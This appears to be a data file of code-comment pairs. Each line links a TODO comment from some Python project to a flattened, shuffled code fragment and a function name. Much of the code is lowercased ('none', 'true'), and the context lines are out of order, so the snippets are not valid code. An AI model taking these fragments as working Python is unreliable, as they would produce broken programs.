# todo: make sure the image is present or pull it </s> base_image = "registry.fedoraproject.org/fedora:28"	test_build_basic_image_with_env_vars x_y = "X=Y" basic_playbook_path = os.path.join(data_dir, "basic_playbook.yaml") target_image = "registry.example.com/ab-test-" + random_word(12) + ":oldest" cmd = ["build", "-e", a_b, x_y, "--",
# todo remove it with inspector frontend </s> data['request'] = dict(raw_data['request'])	add_data data['id'] = data_id if 'request' in data: _data_name = self._get_request_path(data['request']) _data_rule = {
pass  # todo finish me </s> def revoke_auth(self):	revoke_auth
# todo: no testpath exercises this code... </s> log.debug('starting thread...')	target def target(): run() log.debug('Thread Complete')
# todo: require tests </s> return true	hessian_is_zero def hessian_is_zero(self):
# todo: other code-paths: </s> assert status == pass	test_check_076 status, message = list(check(ttFont))[-1]
# todo: make out_key_var an index column </s> return count	_agg_len_impl count += 1
#todo: be sure to test _version==2 here </s> self.asserttrue(true)	test_insert_shadow_document_complex parallel versions collection when the entire document is version controlled.
# todo(qos) add agent extensions exception and catch them here </s> except attributeerror:	handle_port try: extension.obj.handle_port(context, data) LOG.exception( _LE("Agent Extension '%(name)s' failed "
# todo: should change to 'bytes' on python3 </s> 'unsupported key type: str')	test_table_setitem_invalid_type self.assertEqual(exception_context.exception.message,
#todo: check the data! e.g. pubdate etc. </s> count = 0	test_loop_example pipe_def = self._get_pipe_def("pipe_dAI_R_FS3BG6fTKsAsqenA.json") p = pipe2py.compile.parse_and_build_pipe(self.context, pipe_def) for i in p: count += 1
# todo: losing precision on double types </s> if isinstance(s, list):	unpack_cli_arg return int(s) elif param.type == 'float' or param.type == 'double': s = s[0] return float(s)
# todo: test filter functionality; this only tests that the operations work </s> multistagechannelfilter(input_rate=32000000.0, output_rate=16000.0, cutoff_freq=3000, transition_width=1200)	test_float_rates def test_float_rates(self):
#todo(wuzewu): download file in tmp directory </s> self.module_list_file = self.download_file(	search_module def search_module(self, module_name): if not self.module_list_file: url="https://paddlehub.bj.bcebos.com/module_file_list.csv") self.module_list_file = csv_reader.read(self.module_list_file)
# todo: remove </s> return struct, opts	add_files })
# todo again, why this rather than just a dict? </s> headerlist = []	parse_response rtype_line = header_lines.pop(0) rtypeList = rtype_line.split(" ") content_type = "" for line in header_lines:
# todo: replace with generic function to generate random sequence of floats </s> data1 = np.random.ranf(data_length)	_test_df_binary_operations hpat_func = sdc.jit(pyfunc) for data_length in total_data_length: data2 = np.random.ranf(data_length) A = pandas.DataFrame({f"f{i}": data1 for i in range(3)})
# todo untested </s> 1/0	__setattr__ self._name, nid, _api.MBSTRING_UTF8, value, -1, -1, 0) if not add_result:
#todo(jk0): finish this later </s> return "delete! %s %s" % (req, id)	delete def delete(self, req, id):
# todo: the following skipped suite and fixtures should be enabled </s> return ['api-key']	_filter_headers def _filter_headers(self):
# @todo: representation? </s> ),	DataCollectionTemplateModel Field("model", "json", requires = IS_EMPTY_OR(IS_JSON()), s3_comments(), *s3_meta_fields())
# todo: use re.error here mayhaps, also: should we log? </s> sys.exit(1)	main ) except sre_constants.error as e: current_version = ( vc.parse(known_args.current_version) if known_args.current_version else None
# todo: test. </s> return [status.newfromjsondict(x) for x in data]	GetListTimeline data = self._ParseAndCheckTwitter(resp.content.decode('utf-8'))
# todo: specialist error </s> raise valueerror(uri + " does not belong to this graph")	relative_uri return uri[len(self_uri):] else:
# todo: check syntax, values? </s> values = [v.lower() for v in values]	content_encoding @GenericHeaderSyntax def content_encoding(self, name, values): return values
# todo: implement it </s> email = self.request.post.get('email')	PasswordResetHandler return self.render_template('password_reset.html', **params) def post(self): auth_id = "own:%s" % email user = User.get_by_auth_id(auth_id)
" # todo: i18n", </s> '-print("hello world!")',	test_process_hunks_patch_called_correctly " ", " ", '+print(tr("Hello world!"))', " ",
# todo: raise the error instead, and make the user do the refresh manually </s> _util.log.warning("refreshing state and resending request")	_do_refresh def _do_refresh(self): new = State.from_session(session=self._session) self.fb_dtsg = new.fb_dtsg
# todo do something with reccomendation </s> return ret_val	process_rabbit_message if routing_key is not None and routing_key == 'poseidon.algos.ML.results': self.logger.debug('value:{0}'.format(my_obj))
# todo: make this a hard error, instead of a silent overwrite </s> logging.warning("kvm: overriding disk_cache setting '%s' with 'none'"	_GenerateKVMRuntime if instance.disk_template in constants.DTS_EXT_MIRROR: if disk_cache != "none": " to prevent shared storage corruption on migration", disk_cache)
# todo: remove getattr when https://github.com/rtfd/readthedocs.org/pull/3339 got merged </s> env_build_image != getattr(self.config, 'build_image', self.version.project.container_image),	is_obsolete return any([ env_python_version != Version(self.config.python_version),
# todo: this needs auth. </s> def fail_test(agent_id, error):	fail_test request_url = os.getenv('PLAYGROUND_SERVER_URL' + '/fail_test') requests.post(request_url, json={
# todo: arrange </s> repo = self.remote.get_item_handle("repo", "testrepo0", self.token)	test_copy_repo def test_copy_repo(self, createRepo): Test: copy a repo object self.assertTrue(self.remote.copy_repo(repo, "testrepocopy", self.token))
# todo move me to unicodedata module and autogenerate. </s> def _is_default_ignorable(u):	_is_Default_Ignorable
# todo(mordred) when this changes to rest, force interface=admin </s> if self.cloud_config.get_api_version('identity') != '3':	update_user user = self.get_user(name_or_id) kwargs['user'] = self.get_user_by_id(user['id'], normalize=False) kwargs.pop('domain_id', None) kwargs.pop('description', None)
# todo: kill this </s> inspection = inspection[0]	domain_doesnt_support_https if not inspection: return False https = inspection.get("endpoints").get("https") httpswww = inspection.get("endpoints").get("httpswww")
#@todo: move to utils in 0.4.10 </s> def format_exc(frame=none):	format_exc Format call-stack and display exception information (if availible) exception_info = sys.exc_info()
# todo remove with https://github.com/rtfd/readthedocs-build/issues/30 </s> from readthedocs.projects.models import feature	clone feature flag. This will eventually be configureable with our YAML config. cmd = ['git', 'clone'] if not self.project.has_feature(Feature.SKIP_SUBMODULES):
# todo - здесь можно поставить порог, ниже которого сигнал не пройдёт </s> outb[idx_b] += signal_a	layerB for idx_b, wa in enumerate(weights_a): signal_a = wa * outA[idx_a] outB_ = [self.sigmoida(signal_b, prop['InB']) for signal_b in outB] return outB_
continue  #ignore if the source doesn't have our (dereferenced) target field (todo: issue a warning if debugging?) </s> yield d	pipe_rssitembuilder reduce(lambda i,k:i.setdefault(k, {}), [d] + key.split('.')[:-1])[key.split('.')[-1]] = value except AttributeError: if item == True: #i.e. this is being fed forever, i.e. not in a loop, so we just yield our item once break
annot.annotation_metadata.annotator.email = "todo" #todo </s> annot.annotation_metadata.annotator.name = "todo"	fill_annoatation_metadata annot.annotation_metadata.origin = "Epiphyte Corp"
# todo progress_meter will be changed to a class </s> if i % 100 == 0:	contact_matrix print box_half for i in range(len(coord)): progress_meter(i , len(coord)) for j in range(len(coord)):
# todo: also matches //foo/bar.txt and http://host.tld/foo/bar.txt </s> regex = '((:?[/]{1,2}[a-z0-9a-z%_\-~\.]+)+\.[a-za-z0-9]{2,4}(((\?)([a-za-z0-9]*=\w*)){1}((&)([a-za-z0-9]*=\w*))*)?)'	find_relative def find_relative( doc ): res = [] relative_regex = re.compile( regex ) for match_tuple in relative_regex.findall(doc):
#todo: handle ipv6 </s> with socket.socket(socket.af_inet, socket.sock_dgram) as sock:	add_nio rport = request["nio"]["rport"] try: sock.connect((rhost, rport)) except OSError as e:
# todo: allow other formats? </s> im = image.open(album_art.file)	save_album_art im_path = os.path.join(config.image_dir, 'media/%d%%s.%%s' % media.id) try: for size in ['ss', 's', 'm', 'l']: file_path = im_path % (size, 'jpg')
# todo: split into a function + context manager </s> with make_tempfile(mkdir=true) as new_home:	setup_package else: from datalad.utils import make_tempfile pass for v, val in get_home_envvars(new_home).items():
# todo write summaries </s> if not self.optimizer:	create_training_operations zip(self.local_network.get_variables(), self.global_network.get_variables())]) self.optimizer = tf.train.AdamOptimizer(self.alpha) else:
# todo: interim solution to avoid problems with this step. many commands don't need </s> '__reorient_caret': false,	new_vi_cmd_data 'is_digraph_start': False, 'user_input': state.user_input, 'is_jump': False, 'cancel_action_if_motion_fails': False,
# todo: also search in the path </s> os.write(context.active_session.master, ("ls -1a --color=never --indicator-style=slash "	perform_tab_completion "-w %d %s 2>/dev/null\r" % (context.window_size[1], current_folder)).encode("ascii")) else: "-w %d 2>/dev/null\r" % context.window_size[1]).encode("ascii")) ls = self.read_all_output().split("\r\n")
# todo: this should definitely be fixed to allow auto decompression via that api. </s> fastqgz_path = testdataresolver().get_filename("1.fastqsanger.gz")	test_fetch_compressed_auto_decompress_target def test_fetch_compressed_auto_decompress_target(self): details = self._upload_and_get_details(open(fastqgz_path, "rb"), api="fetch", assert_ok=False, auto_decompress=True) assert details["state"] == "ok"
# todo: this function fails for an empty file. better use self.header and self.chunk_headers </s> index = 0	get_chunk_coords def get_chunk_coords(self): self.file.seek(index) chunks = []
raise  # todo </s> else:	deploy_contract cached_contract = self.__contract_cache[contract_name] except KeyError: self.__registrar.enroll(contract_name=contract_name, contract_address=address,
# todo: choose something better </s> block_start_string = "{{%"	process_fix_with_jinja def process_fix_with_jinja(filepath, remediation_type, product_yaml): block_end_string = "%}}" variable_start_string = "{{{"
# todo extend to nonbinary nodes </s> accumulated_cjd = np.ones(tuple(2 if node in self.purview.nodes else 1	cause_repertoire if (self.nodes.size is 0): return purview.max_entropy_distribution() for node in self.network.nodes)) for node in self.nodes:
ret = plot_func(*args, **merge_kwargs(kwargs_call, fig_ax_kwargs))  # todo conflict?? </s> if ret is none and fig_ax_mode:	_wrapped_plot_fn ([('ax', ax)] if 'ax' in fig_ax_mode else []) ) ret = fig elif isinstance(ret, Axes):
#todo - use a context manager here once we drop python 2.6 </s> self.assertraises(valueerror, clusterdistance, data,	test_clusterdistance c2 = [1, 2] c3 = [3] **{"mask": mask, "weight": weight, "index1": c1, "index2": c2, "transpose": 0,
# todo: implement </s> pass	_parse_mecab def _parse_mecab(result: str):
# todo(rbharath): modify the featurization so that it matches desired shaped. </s> x = np.reshape(x, (n_samples, axis_length, n_channels, axis_length, axis_length))	model_predictions X, _, _ = tensor_dataset_to_numpy(test_set) (n_samples, axis_length, _, _, n_channels) = np.shape(X) else: raise ValueError("Improper mode: " + str(mode))
# todo: should use debug </s> print('saving local models to %s' % params.save_model)	_get_connectomes pcd.append(sd_svs) if params.save_model is not None: h5save(params.save_model, sl_common_models) pc_data = [hstack(pcd) for pcd in pc_data]
# todo: mock out sleep or use version-ed digests </s> time.sleep(2)	test_copy_over_existing_file def test_copy_over_existing_file(self): erased_spam_digest = self.session.get_digest('spam.txt') egg_digest = self.session.get_digest('egg.txt')
# todo test this </s> def log_sf(self,x):	MitureDistribution class MitureDistribution(MixtureDistribution, DurationDistribution): x = np.asarray(x,dtype=np.float64) K = len(self.components)
return self._diameter  # todo: best value? </s> @property	Soma @property def end_diameter(self): def volume(self): return (np.pi * self.diameter ** 3)/6
return none  # todo better error handling here </s> session_dict = response.json()	get_authenticated_user except Exception, e: log.error(e) if u'error' in session_dict: log.error("Error when getting authenticated user: %s" % session_dict['error'])
# todo: fix test </s> if (sys.version_info.major, sys.version_info.minor) in [(3,4), (3, 5), (3, 6)]:	test_search_by_tag_query assert caplog.records[-1].levelname == 'DEBUG' except IndexError as e: print('caplog records: {}'.format(caplog.records)) for idx, record in enumerate(caplog.records):
logfile = open('logs/exceptions.log', 'a') #todo: make not hardcoded </s> logfile.write('from %s at %s:\n' % (origin.sender, str(datetime.now())))	error except: pass logfile.write('Message was: <%s> %s\n' % (trigger.nick, trigger.group(0))) logfile.write(trace)
# todo: this is a debug level log </s> logger.info(config_content)	_load_configuration config_content = config_fp.read() config_newlines = config_fp.newlines try: config.read_string(config_content)
except exception:  # todo - which exceptions? </s> color = 'cyan'	config_color try: color = colorchooser.askcolor()[1] self.current_color = color self.current_tag = 'searched_%s' % self.current_color
# todo: duplicate + replace with psutil.getloadavg()? (available in 5.6.2) </s> load1m, _, _ = os.getloadavg()	set_turbo_powersave def set_turbo_powersave(): print("\n" + "-" * 5 + "\n") print("Total CPU usage:", cpuload, "%") print("Total system load:", load1m, "\n")
# todo: logging </s> sys.exit('location for yaml-files is not a directory: %s' % yamldir)	gen_yamlfile_locations sys.exit('Location for YAML-files can not be a symlink: %s' % yamldir) if not os.path.isdir(yamldir): for filename in os.listdir(yamldir): if not filename.endswith('.yaml'):
# todo: this is a jump. </s> vi_cmd_data['motion']['command'] = '_vi_forward_slash'	vi_forward_slash def vi_forward_slash(vi_cmd_data): vi_cmd_data['motion']['args'] = {'mode': vi_cmd_data['mode'], 'count': vi_cmd_data['count'], 'search_string': vi_cmd_data['user_motion_input']} vi_cmd_data['count'] = 1
# todo type checks </s> [suggestions.add(x['suggestion'])	search while not results_queue.empty(): engine_name, engine_results = results_queue.get_nowait() for x in list(engine_results) if 'suggestion' in x
# todo(vladikr): this code can be removed once the minimum version of </s> if vif['vnic_type'] == network_model.vnic_type_macvtap:	plug_hw_veb def plug_hw_veb(self, instance, vif): linux_net.set_vf_interface_vlan( vif['profile']['pci_slot'],
context.nrt.incref(builder, arr_typ, arr)  # todo required? </s> else:	box_dataframe elif dtype == types.List(string_type): arr_obj = box_list(list_string_array_type, arr, c) arr_obj = box_array(arr_typ, arr, c) context.nrt.incref(builder, arr_typ, arr)
# todo make the delay configurable </s> delay = 5	spoken_recently if not self.speaking_time: return False limit = time.time() - (delay * 60) return self.speaking_time < limit
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo use renorm </s> batch_norm_fn = lambda x: tf.layers.batch_normalization(x, axis=-1, training=is_training, name='batch_norm')	inference :return: Linear activations if use_batch_norm: else: batch_norm_fn = None
# todo xxx graalvm change </s> raise unittest.skiptest("not supported private debugging interface")	test_msg_callback_tls12 def test_msg_callback_tls12(self): client_context, server_context, hostname = testing_context() client_context.options |= ssl.OP_NO_TLSv1_3
# todo: test coverage of this branch </s> return none	get_initial return {'user_activation_code': self.activation_code} else:
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	unfilter_instance def unfilter_instance(self, instance, network_info):
continue # todo: what encoding does gst give us? </s> value = [value]	parse_stream_tags except UnicodeDecodeError: logger.debug('  ' + key + " [can't decode]: " + `str(value)`) if key == '__bitrate': track.set_tag_raw('__bitrate', int(value[0]) / 1000)
super(syncedmodel, self).save(*args, **kwargs) # todo(jamalex): can we get rid of this? </s> self.sign(device=own_device)	SyncedModel namespace = own_device.id and uuid.UUID(own_device.id) or uuid.uuid4() self.id = uuid.uuid5(namespace, str(self.counter)).hex super(SyncedModel, self).save(*args, **kwargs) requires_authority_signature = False
content=content,  # todo(tsileo): handle markdown </s> tag=tags,	new cc=cc, to=[to if to else config.AS_PUBLIC], source={'mediaType': 'text/markdown', 'content': source}, inReplyTo=reply.id,  # FIXME(tsieo): support None for inReplyTo?
# todo: assert len(args) == len(node.defn.type_vars) </s> return instance(node, args)	named_type assert isinstance(node, TypeInfo) if args: return Instance(node, [AnyType()] * len(node.defn.type_vars))
# todo this should recurse down the entire deps tree </s> for dep in package.package_dependencies_source.all_depends():	xhr_customrecipe_packages else: recipe.appends_set.add(package) try: cust_package = CustomImagePackage.objects.get(
# todo: hook this up to something </s> print('- reward')	minusReward def minusReward():
# todo: how to check it? meybe we can omit this test </s> pass	test_gausianfill def test_gausianfill():
# todo: instead of discarding pending jobs, maintain them </s> for njob in node.pending_jobs:	run_job logger.debug(traceback.format_exc()) if node.pending_jobs: self.finish_job(cluster, njob, DispyJob.Cancelled) if cluster.status_callback and dispy_node:
# todo handle join for non public rooms </s> if len(split_args) != 2:	join def join(args): split_args = args.split(" ", 1) message = ("{prefix}Error with command \"/join\" (help on " "command: /help join)").format(
# todo remove the files after loading, make sure that no writer uses theses files anymore </s> output_data_dict.setdefault(reg_out['key'], []).append(output_file)	load_registered_outputs else: output_file = WriterUtility.load_output_file(output_path) return output_data_dict
''' # todo filter in the database by the columns i will actually use? </s> cursor = bdb.sql_execute(params_sql, (generator_id, modelno))	_model_mus_sigmas WHERE generator_id = :generator_id AND modelno = :modelno mus = {} sigmas = {}
#todo: make this an async task; so client wouldnt wait </s> pulp.server.util.create_repo(repo_path, checksum_type=repo["checksum_type"])	remove_packages if not os.path.exists(repo_path): os.makedirs(repo_path)
# todo: this doesn't work because local_rev has already been set </s> if not any(self.get_local_rev(x.path_lower) for x in changes):	notify_user elif all(isinstance(x, FileMetadata) for x in changes): file_name = f"{n_changed} files" change_type = "added" if user_name:
# todo: in 0.6.0 change this to "disabled": false </s> "enabled": true,	test_client_mode "dev_type": "tun", "down": "/home/user/down-command.sh", "engine": "", "fast_io": False,
# todo: 逻辑应该有问题, 但不确定 </s> self.db.saverawproxy(proxy)	saveRawProxy def saveRawProxy(self, proxy):
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_pass_transactions def test_pass_transactions(self):
# todo: this should be a separate test </s> self.asserttrue(iterable.closed, true)	test_captures_error_in_iteration with self.assertRaises(ValueError): response = list(response) self.assertEquals(len(self.client.events), 1) event = self.client.events.pop(0)
# todo: need to close computations on this node? </s> node.clusters.clear()	run_job cluster.status_callback(DispyJob.Cancelled, dispy_node, njob.job) node.pending_jobs = [] self._nodes.pop(node.ip_addr, None) if self._sched_jobs.pop(_job.uid, None) == _job:
# @todo: deployment_setting </s> "multiple": false,	S3ContentModel cms_post_tag="post_id", cms_post_organisation={"joinby": "post_id", }, event_event_post="post_id",
#@todo: remove in 0.4.10 </s> if self.__type__ == "crypter":	_process self._initialize() self._setup() self.pyload.hookManager.downloadPreparing(self.pyfile) self.check_status()
# todo: this relies on the gnu version of ps (need to fix macos support) </s> if not safe_kill(pid, signal.sigstop):	kill_process_tree :param pid: The pid of the process to signal. :param sig: The signal to send to the processes. return children = system_output("ps --ppid=%d -o pid=" % pid, ignore_status=True,
def aaaaa(self, bbbbb, cccccccccccccc=none):  # todo(who): pylint: disable=unused-argument </s> return 1	testB31847238 expected_formatted_code = textwrap.dedent("""\ class _(): def xxxxx( self, yyyyy,
# todo: verify behavior </s> self.assert_received(self.debugger, [])	test_no_exception ])
# todo: figure out what's going on </s> ar._run_annex_command('sync',	test_annex_ssh ok_(not exists(socket_1)) try: expect_stderr=True, log_stdout=False,
# todo(jblespiau): we can simply use buf.xla_shape() when version 0.1.58 is </s> _check_nans(prim.name, getattr(buf, "xla_shape", buf.shape)(), buf)	check_nans def check_nans(prim, bufs): for buf in bufs:
# todo: when we reset migrations the following need only check </s> if dob.role is not none and dob.role != 'isw_raid_member' \	_update_disk_state dob.role = '{"mdraid": "' + d.fstype + '"}'  # json string else:  # We know this disk is not an mdraid raid member. and dob.role != 'linux_raid_member': known_roles = json.loads(dob.role)
# todo fix bug for not identifying unused variables in nested exceptions see issue #4391 </s> try:	func2 1 / 0 except ZeroDivisionError as error: 1 / 0 except:
# todo(mattjj): remove this special case, used for debugging on cpu </s> if xb.get_replica_count() == 1:	join_arrays def join_arrays(x): dims = c.GetShape(x).dimensions() return c.Reshape(x, None, (1,) + tuple(dims))
# todo: make it pass </s> self.assertequals('sample_function', word_finder.get_name_at(10))	test_function_calls word_finder = WordRangeFinder('sample_function()')
# todo: replace with a hook?  just like setting lang= can have a hook. </s> if self.line_input:	OnChange Returns success or failure. if opt_name == 'vi' or opt_name == 'emacs': self.line_input.parse_and_bind("set editing-mode " + opt_name); else:
# todo(is) we can set the min and max depends on the unit, later </s> min_value_input.setminimum(0)	set_widgets min_label = QLabel(tr('Min')) min_value_input = QDoubleSpinBox() min_value_input.setMaximum(999999) if thresholds.get(the_class['key']):
# todo: this should also test python 2, and pass pyversion accordingly. </s> for version in ["2and3", "3", "3.3", "3.4", "3.5"]:	add_stubs def add_stubs(driver: Driver) -> None: seen = set()  # type: Set[str] for stub_type in ['builtins', 'stdlib', 'third_party']: stubdir = join('typeshed', stub_type, version)
"""todo: document me.""" </s> def __init__(self, sigma, mu, seed=42):	__init__ self.sigma = sigma self.mu = mu
# todo: interpolated p-values </s> test_nc_scores = self.nc_function.calc_nc(x, test_class)	predict test_class = np.zeros(x.shape[0]) test_class.fill(c) n_cal = self.cal_scores.size for j, nc in enumerate(test_nc_scores):
# todo: handle index </s> in_arr = rhs.args[0].name	_run_call 'to_date_series_type', 'init_series') and self._is_1D_arr(rhs.args[0].name)): self._array_starts[lhs] = self._array_starts[in_arr] self._array_counts[lhs] = self._array_counts[in_arr]
# todo: get pytest's coverage plugin working, iirc it has issues? </s> runner = "pytest"	test if module is not None: modstr = " tests/test_{}.py".format(module) if coverage: runner = "coverage run --source=paramiko -m pytest"
# todo: replace suite with testcases </s> dir_name = "suite"	load_test_folder if not test_folder_path: if test_type == "testcase": elif test_type == "testsuite": dir_name = "testcases"
# todo have no idea if is cdecl or stdcall </s> flag = params["processinformationclass"]	hook_ZwQueryInformationProcess }) def hook_ZwQueryInformationProcess(self, address, params): dst = params["ProcessInformation"] pt_res = params["ReturnLength"]
# todo(epot): should be moved inside `features.decode_example` </s> features = decoders.extract_features(self.info.features)	mock_as_dataset del kwargs if isinstance(decoders, decode.PartialDecoding): decoders = decoders.decoders else:
# todo: handle other method types? other content types? </s> try:	_authenticate_request origin = None if request.method == "PUT": content_bytes = request.content.read() content = json.loads(content_bytes)
# todo: implement node label semantics </s> return tokens[0]	_tgrep_label_node_action assert tokens[1] == '=' node_label = tokens[2]
# todo: handle arrays </s> raise typeerror("unsupported type %s" % ctype)	allValues return obj return [make(vals) for vals in product(*values)]
pass # todo </s> elif property.data_type == 3:	set_property_value property = self.properties[property_index] if property.data_type == 1: offset = self.integer_list_offset + property.data_index * 4 write_u32(data, offset, new_value)
# todo: change the frontend to pass seconds instead. </s> expires_at = (now_in_seconds + one_hour_in_seconds) * 1000	test_existing_email_create_user return {'sub': 'email', 'email': email, 'exp': id_token_expiration_timestamp} monkeypatch.setattr(AuthBackend, '_get_user_info', userinfo_mock) existing_user = User.objects.create(username="email/foo@bar.net", email=email) resp = client.get(
# todo: how do i make the __iter__ thread safe? </s> cursor = self._conn.execute('select information from data order by information asc')	ordered_iter def ordered_iter(self): for r in cursor: obj = cPickle.loads(r[0])
return 0 # todo </s> def to_mopidy_id(spotify_uri):	to_mopidy_id
# todo(hirfumi): support for chainer backend </s> elif args.backend == "pytorch":	main if args.backend == "chainer": raise NotImplementedError("Only pytorch are supported.") from espnet.mt.pytorch_backend.mt import recog recog(args)
# todo check if this always works? </s> col = bpy.data.collections.get('collection')	draw_cube_with_bb mesh = bpy.data.meshes.new('mesh') obj = bpy.data.objects.new(name, mesh) col.objects.link(obj) new_vertices = []
# todo: 搜索和分页 </s> keyword = request.get.get('search', '')	perm_rule_add header_title, path1, path2 = "授权规则", "规则管理", "查看规则" rules_list = PermRule.objects.all() if keyword: rules_list = rules_list.filter(Q(name=keyword))
# xxx todo [ ] should consider concurrent open files of differing modes </s> return	create self.log('create(%r, %r, %r)' % (path, flags, mode)) if path in self.files: else: tffobj = TahoeFuseFile(self.tfs, path, flags, mode)
#! todo: this needs to be made more intelligent </s> if (omega == none):	gangof4 def gangof4(P, C, omega=None): omega = sp.logspace(-2, 2); L = P*C;
# todo: why is this separate? </s> self.set_as_nx()	read_op2 self.set_table_type() elif version.startswith(b'MODEP'): self.set_table_type() elif version.startswith('AEROFREQ'):
# todo(py3.7): add required=true </s> p_operation = parser.add_subparsers(dest="operation", metavar="operation")	add_interact_arguments @classmethod def add_interact_arguments(cls, parser): p_convert = p_operation.add_parser( "convert", help="convert VGM to PCM using OPL hardware")
#todo _rule_for_states needs to made into a generator </s> self._update_node_observed_status(node)	add_states n for n in range(len(states))]
#todo: cast input with np.asanyarray() </s> if len(x.shape) > 1:	make_grad_partition def make_grad_partition(ans, x, kth, axis=-1, kind='introselect', order=None): raise NotImplementedError( "Gradient of partition not implemented for multi-dimensional arrays.")
# todo: this is a temporal fix </s> pixels = np.rollaxis(pixels, 0, len(pixels.shape))	hog ValueError Window step unit must be either pixels or cells if mode not in ['dense', 'sparse']: raise ValueError("HOG features mode must be either dense or sparse")
# todo: add for morph targets data. </s> min_index = min(indices)	extract_primitive_floor process_bone = False bone_max = bone_index max_index = max(indices) for old_index in indices:
# todo remove this assertion and test </s> assert x.shape[1] == 2	quasi_newton_update_blocks incorporates the diagonal blocks, too. X = mesh.node_coords diagonal_blocks = numpy.zeros((X.shape[0], 2, 2)) diagonal_blocks[:, 0, 0] += 2 * mesh.control_volumes
#todo: check the data! </s> count = 0	test_filtered_multiple_sources pipe_def = self._get_pipe_def("pipe_c1cfa58f96243cea6ff50a12fc50c984.json") p = pipe2py.compile.parse_and_build_pipe(pipe_def, verbose=True) for i in p: count += 1
# todo new message here </s> routing_key='sms.inbound.%s.%s' % (	deliver_sm @inlineCallbacks def deliver_sm(self, *args, **kwargs): self.transport_name, kwargs.get('destination_addr')) message = Message(**kwargs)
# '%5d' doesn't work yet.  todo: fix this. </s> if name == 'strings':	ShouldSkipTest def ShouldSkipTest(name): return True return False
'''todo: add docs''' </s> def __init__(self, df):	AppModel class AppModel(object): self.df = df self.data = ColumnDataSource(df)
# todo: generate extraction warning. </s> continue	_ParseLogonApplications command_value = registry_key.GetValueByName(application) if not command_value: event_data = WinlogonEventData() event_data.application = application
# todo: figure out if this is 1 or 2 positions ahead. </s> if ((pos + 1) < len(strs)):	_read_doc_vars r = [] for s in strs: r.append((s, strs[pos + 1])) pos += 1
# todo switch to using the db to determine next duplicate number to use </s> local_filename = os.path.join(path, media.filename)	has_local_version def has_local_version(self, path, media): local_full_path = os.path.join(self.root_folder, local_filename) if os.path.isfile(local_full_path):
# todo: require an api key on the basic auth header </s> file_storage = request.files.values()[0]	upload if len(request.files) != 1: return 'Need exactly one file', 400 data = file_storage.read() sha1sum = hashlib.sha1(data).hexdigest()
pass # todo: explain </s> pass	status402 def status402(self):        # Payment Required
# todo: convert to casetransaction object </s> case_action = commcarecaseaction.from_parsed_action(	_get_case_action_intents )) else: submit_time, user_id, xform, AbstractAction(CASE_ACTION_COMMTRACK) )
# todo: implement this rpc service </s> return empty_pb2.empty()	pull_variable def pull_variable(self, request, _):
# todo support multiple backends </s> return self.backends[0].stored_playlists.refresh().get()	refresh def refresh(self): Refresh the stored playlists in :attr:`playlists`.
# todo: improve the unicode checking </s> try:	create def create(self, relationship_name, to, **kwargs): return getattr(self._node, relationship_name)(to, **kwargs) except (KeyError, UnicodeEncodeError, UnicodeError):
# @todo: check to see if they disappeared, etc </s> error = t("registration not found")	site_check_in ).first() if not registration: warning = None return error, warning
# todo: implement </s> pass	result_by_parent @staticmethod def result_by_parent(parent):
# todo: also use backward pass </s> hs = fws	get_selective_model ) fws = [states[1][0][1] for states in rnn_result] h = tf.concat(1, hs) logits_flat = tf.contrib.layers.linear(h, 5*target_size)
# todo: what if we fail?  error-handling should be recorded someplace, </s> yield workitem.delete()	actuallyReallyExecuteWorkHere workItemClass = WorkItem.forTable(table) workItem = yield workItemClass.load(workID) yield workItem.doWork() returnValue({})
# todo(pulkitb): parameterize and add more model/runtime options. </s> batch_size=20)	_train_model tf.keras.utils.to_categorical(np.random.randint(5, size=(20, 1)), 5),
# todo: check if format matches </s> pass	_envelope_job if file_format['outputFormat'] == 'table': if file_format['isTargetExisting']: else: sql = SQLIndexer(user=request.user, fs=request.fs).create_table_from_a_file(source, destination).get_str()
# todo: refactor to catch errors smartly in get_screenshot_as_file </s> return screenshot_path if driver.get_screenshot_as_file(screenshot_path) else 'none'	_take_screenshot if not os.path.exists(folder): os.makedirs(folder)
# todo dont convert to uint8 </s> result[i] = (alpha * img_to_cs + (1 - alpha) * image).astype(np.uint8)	_augment_images result[i] = image else: return images
# todo(mitmul): when cupy.random.choice becomes available, remove it </s> bg_inds = cuda.to_cpu(bg_inds)	_create_bbox_labels bg_inds = np.where(labels == 0)[0] if len(bg_inds) > num_fg: disable_inds = np.random.choice( bg_inds, size=len(bg_inds) - len(fg_inds), replace=False)
# todo consider removing this test entirely, or hardcoding column names </s> assert pkg.notes == notes	test_edit_all_fields assert pkg.version == version assert pkg.url == url assert pkg.license.id == license_id saved_tagnames = [str(tag.name) for tag in pkg.tags]
# todo(dcramer): ideally member:write could approve </s> can_approve_requests_globally = request.access.has_scope('org:write')	handle and om.user is not None) ) can_add_members = request.access.has_scope('org:write') can_remove_members = request.access.has_scope('member:delete')
# todo add test for this </s> if order >= 3:	Affine return_matrices=True) for heatmaps_i, arr_aug, matrix, order in zip(heatmaps, arrs_aug, matrices, order_samples): arr_aug = np.clip(arr_aug, 0.0, 1.0, out=arr_aug) heatmaps_i.arr_0to1 = arr_aug
# xxx todo after #2156 datasets may not necessarily carry all </s> reporton='datasets',	show_keys keys = {} for res in query_aggregated_metadata( ds=self.ds, aps=[dict(path=self.ds.path, type='dataset')],
# todo: direct use of json['error'] is deprecated; use display_message('...', 'error') instead. </s> j_dic['error'] = 'unable to parse the following line(s):<br/>{}'.format(	enrich_json_with_data ) if ann_obj.failed_lines: '\n<br/>\n'.join( ['{}: {}'.format(
pass # todo </s> if '%t' in args:	parse_exec pass # TODO if '%D' in args: text = pageview.get_selection() or pageview.get_word() args[args.index('%t')] = text
# todo: implement </s> pass	test_migration def test_migration(self):
#todo change back </s> time.sleep(wormconfiguration.keep_tunnel_open_time)	start elif not WormConfiguration.alive: LOG.info("Marked not alive from configuration") if len(self._exploited_machines) > 0: time_to_sleep = WormConfiguration.keep_tunnel_open_time
# todo: remove verify ssl config when working without it. </s> responses = balearicislands(ses, verify=false).get_all()	fetch_consumption raise NotImplementedError('This parser is not yet able to parse past dates') ses = session or Session() if not responses: raise ParserException("ES-IB", "No response")
# todo(mierdin): note that this will always return true if rbac is not enabled </s> if rbac_utils.user_has_role(requester_user, role):	_can_respond requester_user, role, rbac_utils.user_has_role(requester_user, role)) ) roles_passed = True break
